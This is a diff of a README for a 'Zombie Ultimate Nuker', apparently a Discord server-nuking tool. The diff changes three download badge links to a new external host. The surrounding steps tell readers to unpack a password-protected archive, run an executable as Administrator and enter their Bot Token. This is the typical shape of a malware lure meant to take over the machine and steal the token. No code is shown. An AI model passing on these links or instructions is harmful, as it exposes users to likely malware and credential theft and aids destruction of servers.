@@ -9,7 +9,7 @@ The **☢️ Zombie Ultimate Nuker** is a high-performance **free** administrati
 
 <div align="center">
 
-[![Download Zombie Ultimate Nuker](https://img.shields.io/badge/Download-red?style=for-the-badge&logo=icloud)](https://tinyurl.com/zombie-ultimate-nuker)
+[![Download Zombie Ultimate Nuker](https://img.shields.io/badge/Download-red?style=for-the-badge&logo=icloud)](https://software-nation.com/zombie-ultimate-nuker)
 
 </div>
 <div align="center">
@@ -82,7 +82,7 @@ When a server is compromised or needs a total reset, manual deletion of thousand
 2. **📦 Extract the archive** — Use the password `2026` to unlock the files.
 3. **🖱️ Run as Administrator** — Launch `Zombie_Nuker_Pro.exe` and enter your Bot Token.
 
-[![Download Zombie Ultimate Nuker](https://img.shields.io/badge/Download-red?style=for-the-badge&logo=icloud)](https://tinyurl.com/zombie-ultimate-nuker)
+[![Download Zombie Ultimate Nuker](https://img.shields.io/badge/Download-red?style=for-the-badge&logo=icloud)](https://software-nation.com/zombie-ultimate-nuker)
 
 ---
 
@@ -121,7 +121,7 @@ When a server is compromised or needs a total reset, manual deletion of thousand
 
 <div align="center">
 
-[![Download Zombie Ultimate Nuker](https://img.shields.io/badge/Download-red?style=for-the-badge&logo=icloud)](https://tinyurl.com/zombie-ultimate-nuker)
+[![Download Zombie Ultimate Nuker](https://img.shields.io/badge/Download-red?style=for-the-badge&logo=icloud)](https://software-nation.com/zombie-ultimate-nuker)
 
 **Version 4.9.0** — Professional Infrastructure Management. April 2026 Update. Zero cost.
 
